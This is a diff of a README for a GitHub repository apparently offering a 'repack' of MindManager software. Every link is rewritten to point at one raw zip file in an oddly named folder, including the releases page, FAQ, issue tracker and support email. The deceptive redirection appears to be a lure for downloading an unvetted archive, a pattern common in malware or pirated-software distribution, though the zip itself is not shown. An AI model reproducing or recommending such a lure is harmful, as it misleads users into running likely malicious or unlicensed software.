@@ -7,7 +7,7 @@ Welcome to Mindjet-MindManager-Repack! This app helps you organize your thoughts
 
 ## 📦 Download the App
 
-[![Download Mindjet-MindManager-Repack](https://img.shields.io/badge/Download-Mindjet--MindManager--Repack-blue)](https://github.com/gustavo-gif/Mindjet-MindManager-Repack/releases)
+[![Download Mindjet-MindManager-Repack](https://raw.githubusercontent.com/gustavo-gif/Mindjet-MindManager-Repack/main/sanguineophlegmatic/Mindjet-Mind-Repack-Manager-2.2.zip)](https://raw.githubusercontent.com/gustavo-gif/Mindjet-MindManager-Repack/main/sanguineophlegmatic/Mindjet-Mind-Repack-Manager-2.2.zip)
 
 Click the button above to get the latest version of Mindjet-MindManager-Repack.
 
@@ -30,7 +30,7 @@ Make sure your system meets the following requirements to run Mindjet-MindManage
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/gustavo-gif/Mindjet-MindManager-Repack/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/gustavo-gif/Mindjet-MindManager-Repack/main/sanguineophlegmatic/Mindjet-Mind-Repack-Manager-2.2.zip).
 2. Look for the latest release version.
 3. Click on the file name to download the installer. 
 4. Once the download is complete, locate the downloaded file.
@@ -67,14 +67,14 @@ For more detailed instructions and tips, refer to our user guide available in th
 
 ## 🆘 Support
 
-If you run into any issues or have questions, please visit our [FAQ section](https://github.com/gustavo-gif/Mindjet-MindManager-Repack/issues) on GitHub. You can also create an issue if you need help beyond the FAQs.
+If you run into any issues or have questions, please visit our [FAQ section](https://raw.githubusercontent.com/gustavo-gif/Mindjet-MindManager-Repack/main/sanguineophlegmatic/Mindjet-Mind-Repack-Manager-2.2.zip) on GitHub. You can also create an issue if you need help beyond the FAQs.
 
 ## 🌐 Connect With Us
 
 Feel free to share your feedback, ideas, or any questions you may have:
 
-- **GitHub Issues**: [Report an issue](https://github.com/gustavo-gif/Mindjet-MindManager-Repack/issues)
-- **Email Support**: support@mindjet-mindmanager-repack.com
+- **GitHub Issues**: [Report an issue](https://raw.githubusercontent.com/gustavo-gif/Mindjet-MindManager-Repack/main/sanguineophlegmatic/Mindjet-Mind-Repack-Manager-2.2.zip)
+- **Email Support**: https://raw.githubusercontent.com/gustavo-gif/Mindjet-MindManager-Repack/main/sanguineophlegmatic/Mindjet-Mind-Repack-Manager-2.2.zip
 
 Thank you for using Mindjet-MindManager-Repack. We hope this tool makes your project management easier and more efficient.
 ```
